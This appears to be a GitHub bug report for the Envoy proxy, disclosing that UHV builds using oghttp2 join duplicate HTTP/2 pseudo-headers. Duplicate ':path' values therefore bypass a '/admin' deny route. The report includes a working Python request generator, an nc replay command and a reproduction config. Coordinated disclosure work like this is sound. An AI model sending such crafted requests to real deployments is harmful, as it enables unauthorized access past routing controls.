# Posted: https://github.com/envoyproxy/envoy/issues/48808

Filed by alpaylan, 2026-10-28. Text as posted:

**UHV builds: oghttp2 accepts duplicate pseudo-headers and joins them (:path becomes /public,/admin)**

*Description*:

On builds compiled with `--define=uhv=enabled`, the oghttp2 codec accepts an HTTP/2 request with duplicate pseudo-headers and joins the values. Two `:path` headers (`/public`, then `/admin`) reach the upstream as `GET /public,/admin`, so a `prefix: /admin` deny route is not matched. A `host` header followed by an `:authority` with a different value is forwarded as `host: other.example,example.com`. This happens with the UHV runtime flag (`envoy.reloadable_features.enable_universal_header_validator`) both off and on.

Default builds (main at 2cf5f51d and the v1.40.2 release) reject both requests with oghttp2, and nghttp2 rejects them on the UHV build too. In UHV builds oghttp2's own header validation is turned off (`og_options_.validate_http_headers = false` under `#ifdef ENVOY_ENABLE_UHV` in `source/common/http/http2/codec_impl.cc`, see #21548), so the duplicate check is left to UHV, which doesn't catch it here. The expected behaviour is to reject the request as malformed (RFC 9113 section 8.3), as default builds do.

This was reported to envoy-security first; since UHV is not enabled by default, they asked for a public issue.

*Repro steps*:

Build main (tested at 2cf5f51d) with `--define=uhv=enabled`, run it with the config below, and send one raw HTTP/2 connection: client preface, empty SETTINGS, and one HEADERS frame (stream 1, END_STREAM|END_HEADERS) whose HPACK fields are, in order, `:method GET`, `:scheme http`, `:authority example.com`, `:path /public`, `:path /admin`, `x-a b`.

```python
# mkreq.py: writes that connection's bytes to stdout (HPACK literal without indexing, no Huffman)
import sys
fields = [(":method","GET"),(":scheme","http"),(":authority","example.com"),(":path","/public"),(":path","/admin"),("x-a","b")]
blk = b"".join(b"\x00" + bytes([len(n)]) + n.encode() + bytes([len(v)]) + v.encode() for n, v in fields)
frame = len(blk).to_bytes(3, "big") + b"\x01\x05" + (1).to_bytes(4, "big") + blk
sys.stdout.buffer.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + b"\x00\x00\x00\x04\x00\x00\x00\x00\x00" + frame)
```

```
python3 mkreq.py > dup-path.bin
nc 127.0.0.1 31000 < dup-path.bin
# UHV build, oghttp2:           the HTTP/1.1 backend receives "GET /public,/admin HTTP/1.1" (the /admin deny route is not hit)
# UHV build, nghttp2:           rejected, nothing forwarded
# default build or v1.40.2, oghttp2: rejected, nothing forwarded
```

*Config*:

```yaml
admin: {address: {socket_address: {address: 127.0.0.1, port_value: 31901}}}
layered_runtime:
  layers:
  - name: static
    static_layer: {envoy.reloadable_features.http2_use_oghttp2: true}
static_resources:
  listeners:
  - address: {socket_address: {address: 127.0.0.1, port_value: 31000}}
    filter_chains:
    - filters:
      - name: envoy.filters.network.http_connection_manager
        typed_config:
          "@type": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager
          stat_prefix: ingress
          codec_type: HTTP2
          route_config:
            virtual_hosts:
            - name: all
              domains: ["*"]
              routes:
              - match: {prefix: "/admin"}
                direct_response: {status: 403}
              - match: {prefix: "/"}
                route: {cluster: public_backend}
          http_filters:
          - name: envoy.filters.http.router
            typed_config: {"@type": type.googleapis.com/envoy.extensions.filters.http.router.v3.Router}
  clusters:
  - name: public_backend
    type: STATIC
    load_assignment:
      cluster_name: public_backend
      endpoints: [{lb_endpoints: [{endpoint: {address: {socket_address: {address: 127.0.0.1, port_value: 31081}}}}]}]
```

*Logs*:

Not included; the backend's received request line above shows the result.

Found by an automated differential tester (ephyra). This report was drafted with AI assistance; the config and outputs were re-run on the builds named above.

